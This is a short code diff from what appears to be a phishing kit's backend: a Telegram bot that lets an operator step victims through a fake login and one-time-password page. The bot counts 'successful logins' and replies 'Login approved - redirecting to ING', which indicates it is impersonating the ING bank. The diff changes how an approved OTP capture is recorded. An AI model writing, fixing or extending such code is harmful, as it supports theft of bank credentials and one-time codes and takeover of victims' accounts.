@@ -773,12 +773,11 @@ bot.on('callback_query', async (q) => {
         await updateAdminPanel();
         return bot.answerCallbackQuery(q.id, 'Proceeding to OTP');
       } else if (v.page === 'otp.html') {
-        v.page = 'success';
-        v.status = 'approved';
-        successfulLogins++;
-        await updateAdminPanel();
-        return bot.answerCallbackQuery(q.id, 'Login approved - redirecting to ING');
-      }
+  v.status = 'ok';
+  successfulLogins++;
+  await updateAdminPanel();
+  return bot.answerCallbackQuery(q.id, 'Login approved - redirecting to ING');
+}
     }
   } catch (err) {
     console.error('Callback error', err);
@@ -792,3 +791,4 @@ app.listen(PORT, '0.0.0.0', () => {
   console.log(`Server running on port ${PORT}`);
   currentDomain = process.env.RAILWAY_STATIC_URL || process.env.RAILWAY_PUBLIC_DOMAIN || `http://localhost:${PORT}`;
 });
+
